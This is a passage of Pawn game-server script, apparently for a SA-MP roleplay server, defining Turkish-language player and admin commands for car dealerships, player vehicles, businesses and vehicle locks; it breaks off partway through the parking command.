CMD:aracsaticinisat(playerid, params[])
{
	new string[128];

    for(new d = 0 ; d < MAX_CARDEALERSHIPS; d++)
	{
        if(IsPlayerInRangeOfPoint(playerid, 3.0, CarDealershipInfo[d][cdEntranceX], CarDealershipInfo[d][cdEntranceY], CarDealershipInfo[d][cdEntranceZ]))
		{
            if(IsPlayerOwnerOfCDEx(playerid, d))
			{
                SetPVarInt(playerid, "editingcd", d);
                format(string,128,"Bu araba satýcýsýný %d$ karþýlýðý satamk istediðinden eminmisin ?\n.", CarDealershipInfo[d][cdPrice] / 2);
                ShowPlayerDialogEx(playerid,DIALOG_CDSELL,DIALOG_STYLE_MSGBOX,"Uyarý:",string,"Sat","Iptal");
                return 1;
            }
            else
			{
                SendClientMessage(playerid, COLOR_GREY, "Bu araba satýcýsýnýn sahibi deðilsin.");
                return 1;
            }
        }
    }
    SendClientMessage(playerid, COLOR_GREY, "Dealership'e yakýn olmalýsýn.");
    return 1;
}

CMD:createcdveh(playerid, params[])
{
    if(PlayerInfo[playerid][pAdmin] < 6)
	{
        SendClientMessage(playerid, COLOR_GREY, "Bu komutu kullanma iznin yok.");
        return 1;
    }
	if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
 	{
  		SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
		return 1;
   	}


    new string[128], price, dealershipid, modelid;
    if(sscanf(params, "ddd", price, dealershipid, modelid)) return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /createcdveh [fiyat] [dealership] [modelid]");

    new Float:X,Float:Y,Float:Z,Float:A;
    GetPlayerPos(playerid,X,Y,Z);
    GetPlayerFacingAngle(playerid, A);
    new cdvehicleid = CreateCarDealershipVehicle(dealershipid, modelid, X, Y, Z, A, price);
    if(cdvehicleid == -1)
	{
        SendClientMessage(playerid, COLOR_GREY, "Hata: Araç limitine ulaþýldý.");
    }
    else
	{
        format(string, sizeof(string), " Araç satýcýsýnda araba yaratýldý ID %d.", cdvehicleid);
        SendClientMessage(playerid, COLOR_GRAD1, string);
    }
    return 1;
}

CMD:destroycdveh(playerid, params[])
{
    if(PlayerInfo[playerid][pAdmin] < 6)
	{
        SendClientMessage(playerid, COLOR_GREY, "Bu komutu kullanma iznin yok.");
        return 1;
    }
	if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
 	{
  		SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
		return 1;
   	}

    new string[128], vehid;
    if(sscanf(params, "d", vehid)) return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /destroycdveh [Araç ID]");

    DestroyCarDealershipVehicle(GetCarDealershipId(vehid), GetCarDealershipVehicleId(vehid));
    SavecDealerships();
    format(string, sizeof(string), " Araç satýcýsýndaki araç yokedildi. ID %d.", vehid);
    SendClientMessage(playerid, COLOR_GRAD1, string);
    return 1;
}

CMD:createdealership(playerid, params[])
{
    if(PlayerInfo[playerid][pAdmin] < 8)
	{
        SendClientMessage(playerid, COLOR_GREY, "Bu komutu kullanma iznin yok.");
        return 1;
    }
	if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
 	{
  		SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
		return 1;
   	}

    new string[128], price, radius, message[64];
    if(sscanf(params, "dds[64]", price, radius, message)) return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /createdealership [fiyat] [menzil] [mesaj]");

    new Float:X,Float:Y,Float:Z;
    GetPlayerPos(playerid,X,Y,Z);
    new dealershipid = CreateCarDealership(X, Y, Z, radius, price, message);
    if(dealershipid == -1)
	{
        SendClientMessage(playerid, COLOR_GREY, "Hata: Araç satýcýsý limiti doldu.");
    }
    else
	{
        format(string, sizeof(string), " Araç satýcýsý yaratýldý ID %d.", dealershipid);
        SendClientMessage(playerid, COLOR_GRAD1, string);
    }
    return 1;
}

CMD:destroydealership(playerid, params[])
{
    if(PlayerInfo[playerid][pAdmin] < 8)
	{
        SendClientMessage(playerid, COLOR_GREY, "Bu komutu kullanma iznin yok.");
        return 1;
    }
	if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
 	{
  		SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
		return 1;
   	}

    new string[128], dealershipid;
    if(sscanf(params, "d", dealershipid)) return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /destroydealership [dealershipid]");

    for(new d = 0 ; d < MAX_CARDEALERSHIPS; d++)
	{
        if(IsPlayerInRangeOfPoint(playerid, 3.0, CarDealershipInfo[d][cdEntranceX], CarDealershipInfo[d][cdEntranceY], CarDealershipInfo[d][cdEntranceZ]))
		{
            DestroyCarDealership(d);
            format(string, sizeof(string), " Araba satýcýsý yokedildi. ID %d.", d);
            SendClientMessage(playerid, COLOR_GRAD1, string);
            return 1;
        }
    }
    if(dealershipid > MAX_CARDEALERSHIPS) return 1;
    if(dealershipid < 0) return 1;
    DestroyCarDealership(dealershipid);
    format(string, sizeof(string), " Araba satýcýsý yokedildi. ID %d.", dealershipid);
    SendClientMessage(playerid, COLOR_GRAD1, string);
    return 1;
}

CMD:createpvehicle(playerid, params[])
{
    if(PlayerInfo[playerid][pAdmin] < 7)
	{
        SendClientMessage(playerid, COLOR_GREY, "Bu komutu kullanma iznin yok.");
        return 1;
    }
    if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 5)
    {
    	SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
		return 1;
	}
    new string[128], giveplayerid, modelid, color1, color2;
    if(sscanf(params, "uddd", giveplayerid, modelid, color1, color2)) return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /createpvehicle [Oyuncu ID/Ýsim] [Araç ID] [Renk 1] [Renk 2]");

   	if(AdminDuty[giveplayerid] == 1)
 	{
  		SendClientMessage(playerid,COLOR_WHITE, "Admin olarak iþ baþýndayken bu komutu kullanamazsýn");
		return 1;
	}

    if(color1 < 0 || color1 > 255) { SendClientMessage(playerid, COLOR_GREY, "   Renkler 0-255 arasýndadýr!"); return 1; }
    if(color2 < 0 || color2 > 255) { SendClientMessage(playerid, COLOR_GREY, "   Renkler 0-255 arasýndadýr!"); return 1; }
    if(modelid < 400 || modelid > 611) { SendClientMessage(playerid, COLOR_GREY, "   Araç ID leri 400 - 611 arasýndadýr!"); return 1; }
    new playervehicleid = GetPlayerFreeVehicleId(giveplayerid),
		totalvehicles = GetPlayerVehicleCountEx(playerid);
	// (TEMPORARY - ZHAO NOTE) TempDonator not added yet
	if(PlayerInfo[giveplayerid][pDonator] == 0 && totalvehicles >= 5) //PlayerInfo[giveplayerid][pTempDonator] > 0) && carsamount >= 5)
	{
        SendClientMessage(playerid, COLOR_GREY, "Bu kiþi daha fazla araç sahibi olamaz, VIP olmayan kiþiler 5 araç alabilir..");
        return 1;
	}
    if(PlayerInfo[giveplayerid][pDonator] == 1 && totalvehicles >= 7)
    {
        SendClientMessage(playerid, COLOR_GREY, "Bu kiþi daha fazla araç sahibi olamaz, Yakut VIP'ler 7 araç alabilir.");
        return 1;
    }
    if(PlayerInfo[giveplayerid][pDonator] == 2 && totalvehicles >= 8)
    {
        SendClientMessage(playerid, COLOR_GREY, "Bu kiþi daha fazla araç sahibi olamaz, Safir VIP'ler 8 araç alabilir.");
        return 1;
    }
    if(PlayerInfo[giveplayerid][pDonator] == 3 && totalvehicles >= 10)
    {
        SendClientMessage(playerid, COLOR_GREY, "Bu kiþi daha fazla araç sahibi olamaz, Elmas VIP'ler 10 araç alabilir.");
        return 1;
    }

    if(playervehicleid == -1) return SendClientMessage(playerid, COLOR_GREY, "Hata: Bu kiþi daha fazla araç sahibi olamaz.");
    if(PlayerInfo[giveplayerid][pDonator] == 0 && VehicleSpawned[giveplayerid] > 0)
    {
		SendClientMessage(playerid, COLOR_GREY, "Bu kiþi VIP deðil ve sadece 1 araç çýkartabilir.Oyuncu yeni bir araç alabilmek için bir aracýný garaja koymalýdýr.");
		return 1;
    }
   	if(PlayerInfo[giveplayerid][pDonator] == 1 && VehicleSpawned[giveplayerid] > 1)
   	{
		SendClientMessage(playerid, COLOR_GREY, "Bu kiþi bir Yakut VIP ve sadece 2 araç çýkartabilir.Oyuncu yeni bir araç alabilmek için bir aracýný garaja koymalýdýr..");
		return 1;
    }
   	if(PlayerInfo[giveplayerid][pDonator] == 2 && VehicleSpawned[giveplayerid] > 2)
   	{
		SendClientMessage(playerid, COLOR_GREY, "Bu kiþi bir Safir VIP ve sadece 3 araç çýkartabilir.Oyuncu yeni bir araç alabilmek için bir aracýný garaja koymalýdýr.");
		return 1;
    }
   	if(PlayerInfo[giveplayerid][pDonator] == 3 && VehicleSpawned[giveplayerid] > 3)
   	{
		SendClientMessage(playerid, COLOR_GREY, "Bu kiþi bir Elmas VIP ve sadece 4 araç çýkartabilir.Oyuncu yeni bir araç alabilmek için bir aracýný garaja koymalýdýr.");
		return 1;
    }
    if(PlayerInfo[giveplayerid][pDonator] < 0 || PlayerInfo[giveplayerid][pDonator] > 3)
    {
    	SendClientMessage(playerid, COLOR_GREY, "Hata: Bu oyuncunun VIP level'i yanlýþ.");
		return 1;
    }

    new Float:X,Float:Y,Float:Z;
    GetPlayerPos(giveplayerid,X,Y,Z);
    new Float:Angle;
    GetPlayerFacingAngle(giveplayerid,Angle);
    new car = CreatePlayerVehicle(giveplayerid, playervehicleid, modelid, X, Y, Z, Angle, color1, color2, 0);
    if(car == INVALID_PLAYER_VEHICLE_ID)
	{
        SendClientMessage(playerid, COLOR_GREY, "Hata: Something went wrong and the car didn't get created.");
    }
    else
	{
        format(string, sizeof(string), "Araç baþarýlý bir þekilde yaratýldý ID %d.", car);
        SendClientMessage(playerid, COLOR_GRAD1, string);
    }

    format(string, sizeof(string), "%s has created a %s for %s (Color 1: %d | Color 2: %d).", GetPlayerNameEx(playerid), GetVehicleName(car), GetPlayerNameEx(giveplayerid), color1, color2);
    Log("logs/playervehicle.log", string);
    return 1;
}

CMD:destroypvehicle(playerid, params[])
{
	new giveplayerid;
	if(sscanf(params, "u", giveplayerid))
		return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /destroypvehicle [Oyuncu ID/Ýsim]");

	if(!IsPlayerConnected(giveplayerid))
		return SendClientMessage(playerid, COLOR_GREY, "Geçersiz oyuncu.");

    if(PlayerInfo[playerid][pAdmin] < 4)
		return SendClientMessage(playerid, COLOR_GREY, "Bu komutu kullanma iznin yok.");

    if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
		return SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");

	if(AdminDuty[giveplayerid] == 1)
		return SendClientMessage(playerid,COLOR_WHITE, "Admin olarak iþ baþýndayken bu komutu kullanamazsýn");

	new
		szVehString[1024];

	for(new i, iModelID; i < MAX_PLAYERVEHICLES; i++) {
		if((iModelID = PlayerVehicleInfo[giveplayerid][i][pvModelId] - 400) >= 0) {
			if(PlayerVehicleInfo[giveplayerid][i][pvImpounded]) {
				format(szVehString, sizeof(szVehString), "%s\n%s (baglanmis)", szVehString, VehicleName[iModelID]);
			}
			else if(PlayerVehicleInfo[giveplayerid][i][pvDisabled]) {
				format(szVehString, sizeof(szVehString), "%s\n%s (kullanilamaz halde)", szVehString, VehicleName[iModelID]);
			}
			else if(!PlayerVehicleInfo[giveplayerid][i][pvSpawned]) {
				format(szVehString, sizeof(szVehString), "%s\n%s (saklý)", szVehString, VehicleName[iModelID]);
			}
			else format(szVehString, sizeof(szVehString), "%s\n%s (ID %i)", szVehString, VehicleName[iModelID], PlayerVehicleInfo[giveplayerid][i][pvId]);
		}
		else strcat(szVehString, "\nBos");
	}
	ShowPlayerDialogEx(playerid, DELETEPLAYERCAR, DIALOG_STYLE_LIST, "Araç Silme", szVehString, "Sil", "Iptal");
	SetPVarInt(playerid, "playeraffectedcarTP", giveplayerid);
	return 1;
}

CMD:aracyardim(playerid, params[])
{
    SendClientMessage(playerid, COLOR_GREEN,"_______________________________________");
    SendClientMessage(playerid, COLOR_WHITE,"*** ARABA SATICISI YARDIM *** - daha fazla bilgi için bir komut yazýn.");
    SendClientMessage(playerid, COLOR_GRAD3,"*** ARABA SATICISI *** /kilitsatinal /kilit /park /modifiyelerisil /aracsil /aracimisat /aracimibul /saticibul");
    SendClientMessage(playerid, COLOR_GRAD3,"*** ARABA SATICISI *** /dmvmenu /anahtarver /anahtarlar /aracakoy /aractanal /aracbagaji /arac /araclarim /modifiyecibul");
    return 1;
}

CMD:kilitsatinal(playerid, params[])
{
    new idx = GetPlayerVirtualWorld(playerid)-100;
    if(idx > 0 && idx < MAX_BIZ && BizInfo[idx][bType] != 1 || idx < 1 || idx > MAX_BIZ) return SendClientMessage(playerid, COLOR_GREY, "Herhangi bir iþ yerinin içinde deðilsin.");
   	if(BizInfo[idx][bType] == 1)
    {
	    ShowPlayerDialogEx(playerid, DIALOG_CDLOCKBUY, DIALOG_STYLE_LIST, "Kilit Satýn Al", "Araç Alarmý=] 1000 $\nAraç Kilidi=] 1500 $", "Satýn Al", "Iptal");
		return 1;
	}
	return 1;
}


CMD:akilit(playerid, params[]) {
	return cmd_kilit(playerid, params);
}

CMD:createbiz(playerid, params[])
{
	new type, string[128];
	if(PlayerInfo[playerid][pAdmin] < 5) return SendClientMessage(playerid, COLOR_GREY, "Bu komutu kullanma yetkiniz yok");
    if(!aDuty[playerid] && PlayerInfo[playerid][pAdmin] < 6) return SendClientMessage(playerid, COLOR_GREY, "Admin görevinde deðilsiniz.");
	if(sscanf(params, "i", type))
	{
		SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /createbiz [TÝP]");
		SendClientMessage(playerid, COLOR_GREY, "TIP: 1) 24/7 | 2) Clothes Shop | 3) Ammunation | 4) Club | 5) Advertisement Agency(Buglu) | 6) Fast Food 7) Elektronikçi(Buglu)");
		return 1;
	}
	if(type < 1 || type > 9) return SendClientMessage(playerid, COLOR_GREY, "1-9 arasýnda seçenek yapabilirsiniz.");
	for(new idx=1; idx<MAX_BIZ; idx++)
	{
	    if(!BizInfo[idx][bType])
		{
		    // Getting iþyeri Setup
		    new Float:X, Float:Y, Float:Z;
		    GetPlayerPos(playerid, X, Y, Z);
		    // Making Business
		    BizInfo[idx][bType] = type;
		    BizInfo[idx][bStatus] = 1;
		    format(BizInfo[idx][bOwner], 32, "GOV");
		    BizInfo[idx][bX] = X;
		    BizInfo[idx][bY] = Y;
		    BizInfo[idx][bZ] = Z;
		    BizInfo[idx][bMoney] = 0;
		    BizInfo[idx][bProducts] = 0;
		    BizInfo[idx][bSold] = 0;
		    BizInfo[idx][bLevel] = 1;
		    BizInfo[idx][bPrice] = 99999999;
			BizInfo[idx][bPickup] = CreateDynamicPickup(1272, 1, X, Y, Z, 0);
			format(string, sizeof(string), "ID: %d\n%s\nSahibi: %s\nDurum: Satýlýk\nFiyat: %d $", idx, RBT(idx), BizInfo[idx][bOwner], BizInfo[idx][bPrice]);
			BizInfo[idx][bText] = CreateDynamic3DTextLabel(string, COLOR_WHITE, X, Y, Z, 15);
			format(string, sizeof(string), "AdminUyarýsý: %s has created iþyeri ID %d.", RPN(playerid), idx);
			SendAdminMessage(COLOR_DARKRED, 1, string);
			Log("logs/business.log", string);
			idx = MAX_BIZ;
		}
	}
	return 1;
}

CMD:deletebiz(playerid, params[])
{
	new id, string[128];
	if(PlayerInfo[playerid][pAdmin] < 5) return SendClientMessage(playerid, COLOR_GREY, "Bu komutu kullanma yetkiniz yok");
    if(!aDuty[playerid] && PlayerInfo[playerid][pAdmin] < 6) return SendClientMessage(playerid, COLOR_GREY, "Admin görevinde deðilsiniz.");
	if(sscanf(params, "i", id)) return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /deletebiz [bizid]");
	if(!BizInfo[id][bType]) return SendClientMessage(playerid, COLOR_GREY, "Invalid iþyeri id.");
    foreach(Player, i)
	{
	    if(PlayerInfo[i][pBiz] == id)
		{
		    PlayerInfo[playerid][pBiz] = 0;
		    format(string, sizeof(string), " Admin %s has deleted your business.", RPN(playerid));
			SendClientMessage(i, COLOR_WHITE, string);
		}
	}
	if(!strcmp("GOV", BizInfo[id][bOwner]))
	{
		format(string, sizeof(string), "AdminUyarýsý: %s has deleted iþyeri zID %d.", RPN(playerid), id);
	}
	else
	{
	    format(string, sizeof(string), "AdminUyarýsý: %s has deleted %s's business. (ID %d)", RPN(playerid), BizInfo[id][bOwner], id);
	}
	SendAdminMessage(COLOR_DARKRED, 1, string);
	Log("logs/business.log", string);
	BizInfo[id][bType] = 0;
    BizInfo[id][bStatus] = 0;
    format(BizInfo[id][bOwner], 32, "");
    BizInfo[id][bX] = 0;
    BizInfo[id][bY] = 0;
    BizInfo[id][bZ] = 0;
    BizInfo[id][bMoney] = 0;
    BizInfo[id][bProducts] = 0;
    DestroyDynamicPickup(BizInfo[id][bPickup]);
    DestroyDynamic3DTextLabel(BizInfo[id][bText]);
	return 1;
}

CMD:bedit(playerid, params[])
{
	new bizid, string[128], input;
	if(PlayerInfo[playerid][pAdmin] < 5) return SendClientMessage(playerid, COLOR_GREY, "Bu komutu kullanma yetkiniz yok");
    if(!aDuty[playerid] && PlayerInfo[playerid][pAdmin] < 6) return SendClientMessage(playerid, COLOR_GREY, "Admin görevinde deðilsiniz.");
	if(sscanf(params, "s[32]", params))
	{
		SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /bedit [option] [bizid]");
		SendClientMessage(playerid, COLOR_GREY, "SECENEKLER: location | price | level | products | vault");
		return 1;
	}
	if(!strcmp(params, "location", true, 8))
	{
	    if(sscanf(params, "s[32]i", params, bizid)) return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /bedit location (biz id)");
		new idx=bizid;
		if(!BizInfo[bizid][bType]) return SendClientMessage(playerid, COLOR_GREY, "Uygunsuz iþyeri ID'si.");
		GetPlayerPos(playerid, BizInfo[bizid][bX], BizInfo[bizid][bY], BizInfo[bizid][bZ]);
		DestroyDynamicPickup(BizInfo[bizid][bPickup]);
    	BizInfo[bizid][bPickup] = CreateDynamicPickup(1272, 1, BizInfo[bizid][bX], BizInfo[bizid][bY], BizInfo[bizid][bZ], 0);
		DestroyDynamic3DTextLabel(BizInfo[bizid][bText]);
        if(!strcmp("GOV", BizInfo[idx][bOwner])) format(string, sizeof(string), "ID: %d\n%s\nSahibi: %s\nDurum: Satýlýk\nFiyat: %d $", idx, RBT(idx), BizInfo[idx][bOwner], BizInfo[idx][bPrice]);
		else format(string, sizeof(string), "ID: %d\n%s\nSahip: %s\nDurum: %s", idx, RBT(idx), BizInfo[idx][bOwner], RBS(idx));
    	BizInfo[bizid][bText] = CreateDynamic3DTextLabel(string, COLOR_WHITE, BizInfo[bizid][bX], BizInfo[bizid][bY], BizInfo[bizid][bZ]+0.3, 15);
	    format(string, sizeof(string), "AdminUyarýsý: %s has changed iþyeri ID %d's location.", RPN(playerid), bizid);
		SendAdminMessage(COLOR_DARKRED, 1, string);
		Log("logs/business.log", string);
	}
	else if(!strcmp(params, "price", true, 5))
	{
	    if(sscanf(params, "s[32]ii", params, bizid, input)) return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /bedit price [bizid] [fiyat]");
		if(!BizInfo[bizid][bType]) return SendClientMessage(playerid, COLOR_GREY, "Invalid iþyeri id.");
		if(strcmp("GOV", BizInfo[bizid][bOwner])) return SendClientMessage(playerid, COLOR_GREY, "You can't edit the price of owned businesses.");
	    BizInfo[bizid][bPrice] = input;
	    format(string, sizeof(string), "ID: %d\n%s\nSahibi: %s\nDurum: Satýlýk\nFiyat: %d $", bizid, RBT(bizid), BizInfo[bizid][bOwner], BizInfo[bizid][bPrice]);
	    UpdateDynamic3DTextLabelText(BizInfo[bizid][bText], COLOR_WHITE, string);
	    format(string, sizeof(string), "AdminUyarýsý: %s has set iþyeri ID %d's price to $%d.", RPN(playerid), bizid, input);
		SendAdminMessage(COLOR_DARKRED, 1, string);
		Log("logs/business.log", string);
	}
	else if(!strcmp(params, "level", true, 5))
	{
	    // L1: 0 | L2: 100 | L3: 300 | L4: 700 | L5: 1200
	    if(sscanf(params, "s[32]ii", params, bizid, input)) return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /bedit level [bizid] [level]");
    	if(!BizInfo[bizid][bType]) return SendClientMessage(playerid, COLOR_GREY, "Invalid iþyeri id.");
    	if(input < 0 || input > 5) return SendClientMessage(playerid, COLOR_GREY, "Levels are between 1 and 5.");
	    BizInfo[bizid][bLevel] = input;
	    if(input == 1) BizInfo[bizid][bSold] = 0;
	    if(input == 2) BizInfo[bizid][bSold] = 100;
	    if(input == 3) BizInfo[bizid][bSold] = 300;
	    if(input == 4) BizInfo[bizid][bSold] = 700;
	    if(input == 5) BizInfo[bizid][bSold] = 1200;
	    format(string, sizeof(string), "AdminUyarýsý: %s has set iþyeri ID %d's level to %d.", RPN(playerid), bizid, input);
		SendAdminMessage(COLOR_DARKRED, 1, string);
		Log("logs/business.log", string);
	}
	else if(!strcmp(params, "products", true, 8))
	{
	    if(sscanf(params, "s[32]ii", params, bizid, input)) return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /bedit products [bizid] [miktar]");
    	if(!BizInfo[bizid][bType]) return SendClientMessage(playerid, COLOR_GREY, "Invalid iþyeri id.");
    	if(input < 0) return SendClientMessage(playerid, COLOR_GREY, "Products can't be negative.");
	    BizInfo[bizid][bProducts] = input;
	    format(string, sizeof(string), "AdminUyarýsý: %s has set iþyeri ID %d's products to %d.", RPN(playerid), bizid, input);
		SendAdminMessage(COLOR_DARKRED, 1, string);
		Log("logs/business.log", string);
	}
	else if(!strcmp(params, "vault", true, 5))
	{
	    if(sscanf(params, "s[32]ii", params, bizid, input)) return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /bedit vault [bizid] [miktar]");
    	if(!BizInfo[bizid][bType]) return SendClientMessage(playerid, COLOR_GREY, "Invalid iþyeri id.");
    	if(input < 0) return SendClientMessage(playerid, COLOR_GREY, "Vault money can't be negative.");
	    BizInfo[bizid][bMoney] = input;
	    format(string, sizeof(string), "AdminUyarýsý: %s has set iþyeri ID %d's vault money to $%d.", RPN(playerid), bizid, input);
		SendAdminMessage(COLOR_DARKRED, 1, string);
		Log("logs/business.log", string);
	}
	else if(!strcmp(params, "truckers", true, 8))
	{
   	    if(sscanf(params, "s[32]ii", params, bizid, input)) return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /bedit truckers [bizid] [secenek] (1=Accepting | 2=NotAccepting");
        if(!BizInfo[bizid][bAP])
		{
		    BizInfo[bizid][bAP] = 1;
		    format(string, sizeof(string), "AdminUyarýsý: %s has set iþyeri ID %d to accept truckers.", RPN(playerid), bizid);
			SendAdminMessage(COLOR_DARKRED, 1, string);
			Log("logs/business.log", string);
		}
		else
		{
		    BizInfo[bizid][bAP] = 0;
		    format(string, sizeof(string), "AdminUyarýsý: %s has set iþyeri ID %d to NOT accept truckers.", RPN(playerid), bizid);
			SendAdminMessage(COLOR_DARKRED, 1, string);
			Log("logs/business.log", string);
		}
	}
	return 1;
}

CMD:gotobiz(playerid, params[])
{
    new idx, string[128];
	if(PlayerInfo[playerid][pAdmin] < 5) return SendClientMessage(playerid, COLOR_GREY, "Bu komutu kullanma yetkiniz yok");
    if(!aDuty[playerid] && PlayerInfo[playerid][pAdmin] < 6) return SendClientMessage(playerid, COLOR_GREY, "Admin görevinde deðilsiniz.");
	if(sscanf(params, "i", idx)) return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /gotobiz [bizid]");
	if(!BizInfo[idx][bType]) return SendClientMessage(playerid, COLOR_GREY, "Invalid iþyeri id.");
	SetPlayerVirtualWorld(playerid, 0);
	SetPlayerInterior(playerid, 0);
	SetPlayerPos(playerid, BizInfo[idx][bX], BizInfo[idx][bY], BizInfo[idx][bZ]);
	format(string, sizeof(string), " You have teleported to iþyeri ID %d.", idx);
	SendClientMessage(playerid, COLOR_WHITE, string);
	return 1;
}

CMD:asellbiz(playerid, params[])
{
	new bizid, string[128];
	if(PlayerInfo[playerid][pAdmin] < 5) return SendClientMessage(playerid, COLOR_GREY, "Bu komutu kullanma yetkiniz yok");
    if(!aDuty[playerid] && PlayerInfo[playerid][pAdmin] < 6) return SendClientMessage(playerid, COLOR_GREY, "Admin görevinde deðilsiniz.");
	if(sscanf(params, "i", bizid)) return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /asellbiz [bizid]");
	if(!BizInfo[bizid][bType]) return SendClientMessage(playerid, COLOR_GREY, "Invalid iþyeri id.");
	if(!strcmp("GOV", BizInfo[bizid][bOwner], true)) return SendClientMessage(playerid, COLOR_GREY, "This iþyeri is not owned by anybody.");
	foreach(Player, i)
	{
	    if(PlayerInfo[i][pBiz] == bizid)
		{
			PlayerInfo[i][pBiz] = 0;
			format(string, sizeof(string), " Admin %s has sold your business.", RPN(playerid));
			SendClientMessage(i, COLOR_WHITE, string);
		}
	}
	format(string, sizeof(string), "AdminUyarýsý: %s has sold %s's business. (ID %d)", RPN(playerid), BizInfo[bizid][bOwner], bizid);
	SendAdminMessage(COLOR_DARKRED, 1, string);
	Log("logs/business.log", string);
    BizInfo[bizid][bStatus] = 0;
    format(BizInfo[bizid][bOwner], 32, "GOV");
    format(string, sizeof(string), "ID: %d\n%s\nSahibi: %s\nDurum: Satýlýk\nFiyat: %d $", bizid, RBT(bizid), BizInfo[bizid][bOwner], BizInfo[bizid][bPrice]);
 	UpdateDynamic3DTextLabelText(BizInfo[bizid][bText], COLOR_WHITE, string);
	return 1;
}


CMD:kilit(playerid, params[])
{
    new Float: x, Float: y, Float: z;
    if(PlayerInfo[playerid][pVehicleKeysFrom] != INVALID_PLAYER_ID)
	{
        new ownerid = PlayerInfo[playerid][pVehicleKeysFrom];
        if(IsPlayerConnected(ownerid))
		{
            new d = PlayerInfo[playerid][pVehicleKeys];
            if(PlayerVehicleInfo[ownerid][d][pvId] != INVALID_PLAYER_VEHICLE_ID) GetVehiclePos(PlayerVehicleInfo[ownerid][d][pvId], x, y, z);
            if(IsPlayerInRangeOfPoint(playerid, 10.0, x, y, z))
			{
                if(PlayerVehicleInfo[ownerid][d][pvLock] > 0)
				{
                    if(PlayerVehicleInfo[ownerid][d][pvLocked] == 0)
					{
                        GameTextForPlayer(playerid,"~r~Arac kilitlendi!",5000,6);
                        PlayerPlaySound(playerid, 1145, 0.0, 0.0, 0.0);
                        PlayerVehicleInfo[ownerid][d][pvLocked] = 1;
                        LockPlayerVehicle(ownerid, PlayerVehicleInfo[ownerid][d][pvId], PlayerVehicleInfo[ownerid][d][pvLock]);
                        return 1;
                    }
                    else
					{
                        GameTextForPlayer(playerid,"~g~Aracin kilidi acildi!",5000,6);
                        PlayerPlaySound(playerid, 1145, 0.0, 0.0, 0.0);
                        PlayerVehicleInfo[ownerid][d][pvLocked] = 0;
                        UnLockPlayerVehicle(ownerid, PlayerVehicleInfo[ownerid][d][pvId], PlayerVehicleInfo[ownerid][d][pvLock]);
                        return 1;
                    }
                }
                else
				{
                    SendClientMessage(playerid, COLOR_GREY, "Aracýnda bir kilit sistemin yok");
                    return 1;
                }
            }
        }
    }
    for(new d = 0 ; d < MAX_PLAYERVEHICLES; d++)
    {
        if(PlayerVehicleInfo[playerid][d][pvId] != INVALID_PLAYER_VEHICLE_ID) GetVehiclePos(PlayerVehicleInfo[playerid][d][pvId], x, y, z);
        if(IsPlayerInRangeOfPoint(playerid, 3.0, x, y, z))
		{
            if(PlayerVehicleInfo[playerid][d][pvLock] > 0 && PlayerVehicleInfo[playerid][d][pvLocked] == 0)
			{
                GameTextForPlayer(playerid,"~r~Arac kilitlendi!",5000,6);
                PlayerPlaySound(playerid, 1145, 0.0, 0.0, 0.0);
                PlayerVehicleInfo[playerid][d][pvLocked] = 1;
                LockPlayerVehicle(playerid, PlayerVehicleInfo[playerid][d][pvId], PlayerVehicleInfo[playerid][d][pvLock]);
                return 1;
            }
            else if(PlayerVehicleInfo[playerid][d][pvLock] > 0 && PlayerVehicleInfo[playerid][d][pvLocked] == 1)
			{
                GameTextForPlayer(playerid,"~g~Arac kilidi acildi!",5000,6);
                PlayerPlaySound(playerid, 1145, 0.0, 0.0, 0.0);
                PlayerVehicleInfo[playerid][d][pvLocked] = 0;
                UnLockPlayerVehicle(playerid, PlayerVehicleInfo[playerid][d][pvId], PlayerVehicleInfo[playerid][d][pvLock]);
                return 1;

            }
            SendClientMessage(playerid, COLOR_GREY, " Aracýnda herhangi bir kilit sistemi yok.");
            return 1;
        }
    }
    SendClientMessage(playerid, COLOR_GREY, "Sahip olduðun bir aracýn yakýnýnda deðilsin");
    return 1;
}

CMD:park(playerid, params[])
{
	if(PlayerInfo[playerid][pVehicleKeysFrom] != INVALID_PLAYER_ID)
	{
	new	carid;
	new Float:plocx;
	new Float:plocy;
	new Float:plocz;
	new ownerid = PlayerInfo[playerid][pVehicleKeysFrom];
		if(IsPlayerConnected(ownerid))
		{
			new d = PlayerInfo[playerid][pVehicleKeys];
			if(IsPlayerInVehicle(playerid, PlayerVehicleInfo[ownerid][d][pvId]))
			{
			    if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return SendClientMessage(playerid, COLOR_GREY, "Sürücü koltuðunda olman lazým.");
				new Float:x, Float:y, Float:z, Float:angle, Float:health;
				GetVehicleHealth(PlayerVehicleInfo[ownerid][d][pvId], health);
				if(health < 800) return SendClientMessage(playerid, COLOR_GREY, " Aracýnýz park etmek için çok hasarlý.");
				if(PlayerInfo[playerid][pLockCar] == GetPlayerVehicleID(playerid)) PlayerInfo[playerid][pLockCar] = INVALID_VEHICLE_ID;
